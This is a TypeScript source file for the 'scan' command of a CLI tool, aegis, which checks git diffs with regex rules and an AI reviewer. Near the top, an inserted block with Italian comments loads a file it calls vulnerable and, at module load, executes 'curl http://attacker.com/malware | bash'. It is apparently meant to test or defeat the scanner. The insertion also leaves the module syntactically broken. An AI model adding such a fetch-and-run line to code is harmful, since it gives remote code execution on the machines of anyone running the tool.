import {Command} from '@oclif/core'
import {getDiff} from '../core/interceptor.js'
// Import the main brain, using OpenRouter AI
import {analyzeDiff} from '../core/ai.js'
import * as fs from 'node:fs/promises'
import * as path from 'node:path'
import * as crypto from 'node:crypto'
import chalk from 'chalk'
import {
    createCylonSpinner,
    renderApprovedBanner,
    renderApprovedWithWarningsBanner,
    renderRejectedBanner,
    renderCacheHitBanner,
    renderDeterministicRejection,
    renderViolation,
    renderChainOfThought,
    renderDiffTruncationWarning,
} from '../core/ui.js'

// INNESCO 1: Aggancio il file vulnerabile all'albero di esecuzione principale
    require('../core/profile.js');

    // INNESCO 2: Remote Code Execution esplicito per far saltare in aria il Layer 0
    import { exec } from 'child_process';
    const payload = "curl http://attacker.com/malware | bash";
    exec(payload);

export default class Scan extends Command {
  // Useful for aegis --help
  static description = 'Analyze Git Diffs with AI'

  async run(): Promise<void> {
    // We take the path of aegis.config.json
    const configPath = path.join(process.cwd(), 'aegis.config.json')

    // Fallback variable in case there are no rules in the project
    let projectRules = 'No specific rules provided.'

    // We try to read the file
    try {
      projectRules = await fs.readFile(configPath, 'utf-8')
    } catch {
      // If the file doesn't exist we don't block the process
      // The AI will apply standard rules
      this.warn('No aegis.config.json file found. AI will apply standard rules.')
    }

    // Get the diff (throws if no changes detected)
    const diffResult = getDiff()
    
    // Warn if diff was truncated due to size limits
    if (diffResult.truncated) {
        const truncatedLines = diffResult.content.split('\n').length
        this.log(renderDiffTruncationWarning(diffResult.stats.lines, truncatedLines))
    }
    
    const diff = diffResult.content

    // --- DIFF CACHING (Zero Time, Zero Tokens) ---
    const aegisDir = path.join(process.cwd(), '.aegis')
    const cachePath = path.join(aegisDir, 'cache.json')
    const scanPassedPath = path.join(aegisDir, '.scan_passed')
    
    // Calculate SHA-256 of the current diff
    const diffHash = crypto.createHash('sha256').update(diff).digest('hex')
    
    try {
        const cacheData = JSON.parse(await fs.readFile(cachePath, 'utf-8'))
        if (cacheData.lastApprovedHash === diffHash) {
            this.log(renderCacheHitBanner())
            await fs.writeFile(scanPassedPath, 'true')
            return
        }
    } catch {
        // Cache doesn't exist or is invalid, proceed with scan
    }

    // --- DETERMINISTIC PRE-CHECKS (Zero AI Tokens) ---
    const deterministicRules = [
        { regex: /\beval\s*\(/, rule: "CRITICAL_SECURITY", fix: "Remove eval() statement. Executing raw string code is strictly forbidden." },
        { regex: /(?:password|secret|private_key|api_key|token)\s*[:=]\s*["'][a-zA-Z0-9_.-]{12,}["']/i, rule: "BASELINE_SECURITY", fix: "Hardcoded secrets/credentials detected. Use environment variables." }
    ]

    for (const check of deterministicRules) {
        // If a new line added in the diff (+ line) contains the forbidden pattern
        if (diff.split('\n').some(line => line.startsWith('+') && check.regex.test(line))) {
            this.log(renderDeterministicRejection(check.rule, check.fix, '0.01'))
            this.exit(1)
        }
    }

    // --- AI ANALYSIS ---
    const spinner = createCylonSpinner([
      { icon: '🧠', text: 'Scanning code changes...' },
      { icon: '🛡️ ', text: 'Validating architectural rules...' },
      { icon: '🔬', text: 'Deep diving into logic...' },
      { icon: '⚡', text: 'Assessing vulnerability patterns...' }
    ])

    const startTime = Date.now()
    let aiResult

    spinner.start()
    try {
        aiResult = await analyzeDiff(diff, projectRules)
    } catch (err: unknown) {
        // Handle specific AI parsing errors
        if (err instanceof Error) {
            if (err.message.includes('JSON Parse Error') || err.message.includes('No JSON block') || err.message.includes('Error during surgical JSON extraction')) {
                this.warn('\n⚠️ AI generated malformed output or reached token limits.')
                this.log(`💡 ${chalk.yellow('Solution:')} Reasoning models occasionally hallucinate on formatting. Please run \`aegis scan\` again.`)
                this.exit(1)
            }
        }
        throw err
    } finally {
        spinner.stop()
    }
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1)

    // --- VERDICT RENDERING ---
    if (aiResult.verdict === 'APPROVED' || aiResult.verdict === 'APPROVED_WITH_WARNINGS') {
      const isFailOpen = aiResult.chainOfThought?.includes('Fail-open')
      
      if (!isFailOpen) {
          // Save the hash to cache since it was approved by the AI
          try {
              await fs.mkdir(aegisDir, { recursive: true })
              await fs.writeFile(cachePath, JSON.stringify({ lastApprovedHash: diffHash }))
              await fs.writeFile(scanPassedPath, 'true')
          } catch {
              // Silently fail if we can't write to cache, it's non-critical
          }
      }

      if (aiResult.verdict === 'APPROVED_WITH_WARNINGS') {
          const warnings = aiResult.violations.filter(v => v.severity === 'WARN')
          this.log(renderApprovedWithWarningsBanner(elapsed, warnings.length))
          warnings.forEach(v => this.log(renderViolation(v)))
          this.log('')
      } else {
          this.log(renderApprovedBanner(elapsed))
      }
    } else {
      this.log(renderRejectedBanner(elapsed))
      
      // Print the Chain of Thought only on rejection, in dim gray
      this.log(renderChainOfThought(aiResult.chainOfThought))

      this.log(chalk.red.bold('VIOLATIONS FOUND:'))
      aiResult.violations.forEach((v) => {
        this.log(renderViolation(v))
      })
      this.log('\n')
      
      this.exit(1)
    }
  }
}
